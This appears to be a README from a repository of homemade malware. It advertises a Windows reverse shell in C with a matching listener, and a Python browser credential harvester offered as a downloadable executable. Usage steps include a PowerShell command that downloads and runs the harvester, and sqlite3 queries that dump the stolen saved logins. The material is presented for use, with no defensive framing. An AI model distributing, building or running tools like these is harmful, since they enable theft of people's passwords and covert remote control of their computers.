## Simple reverse shell (C)
It's a simple reverse shell in C (duh), it uses winsock 2.2 and you have to set your IP and port in the dedicated variables in the code, i tried to document the code well in comments.

## Simple listener (C)
Simple listener made for the previous simple reverse shell, with custom commands you can define in the code\
Set the listening port in the code, compile and enjoy :) 



## [Browser Credential Harvester (Python)](https://github.com/0xUnd3adBeef/DIY-Malware/releases/download/Windows_Executable/GetBrowserPasswords-v1.0.exe)
Python tool that harvests Firefox, Edge, Chrome, Brave, Opera ( | GX ) and Vivaldi to put them in a password protected (this part still doesn't work) zip archive.
```powershell
PS C:\tempdir> Invoke-WebRequest "https://github.com/0xUnd3adBeef/DIY-Malware/releases/download/Windows_Executable/GetBrowserPasswords-v1.0.exe" -o GetBrowserPasswords-v1.0.exe
PS C:\tempdir> .\GetBrowserPasswords-v1.0.exe
PS C:\tempdir> ls


    Répertoire : C:\tempdir


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        07/11/2025     14:43          20319 browser_profiles_20251107_144319.zip
-a----        07/11/2025     14:43        7265288 GetBrowserPasswords-v1.0.exe
```

Unzip the archive, open "Login Data" in sqlite3

```bash
┌──(kali㉿kali)-[~/Cool Stuff]
└─$ sqlite3 Login\ Data
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
breached                logins_edge_extended    stats                 
insecure_credentials    meta                    sync_entities_metadata
logins                  password_notes          sync_model_metadata   
sqlite> SELECT * FROM meta;
SELECT * FROM logins;
SELECT * FROM sqlite_sequence;
SELECT * FROM sync_entities_metadata;
SELECT * FROM sync_model_metadata;
SELECT * FROM insecure_credentials;
SELECT * FROM password_notes;
SELECT * FROM breached;
SELECT * FROM logins_edge_extended;
SELECT * FROM stats;

[URLs, usernames and passwords are going to show here]
```
